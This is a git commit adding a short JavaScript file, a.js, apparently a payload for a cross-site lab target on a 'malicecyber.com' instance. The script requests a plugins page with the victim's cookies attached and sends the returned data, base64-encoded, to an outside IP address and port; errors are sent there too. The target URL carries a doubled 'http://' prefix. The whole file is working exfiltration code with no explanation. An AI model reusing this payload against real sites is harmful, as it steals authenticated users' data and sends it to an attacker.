000c4902aad00fdc97e67437451f2df711dffe6f
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 07:37:21 +0100

    Create a.js

---
+++ a.js
@@ -0,0 +1,18 @@
+const url4 = 'http://http://website-p3h2v8.inst.malicecyber.com/show-plugins';
+
+// Making a GET request using fetch()
+fetch(url4, {
+  credentials: 'include'  
+})
+  .then(response => {
+    return response.json();
+  })
+  .then(data => {
+    console.log("Here is the data");
+    console.log(data);
+    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
+  })
+  .catch(error => {
+    console.log("error");
+    fetch("http://82.65.210.151:24000/?error" + error);
+  });
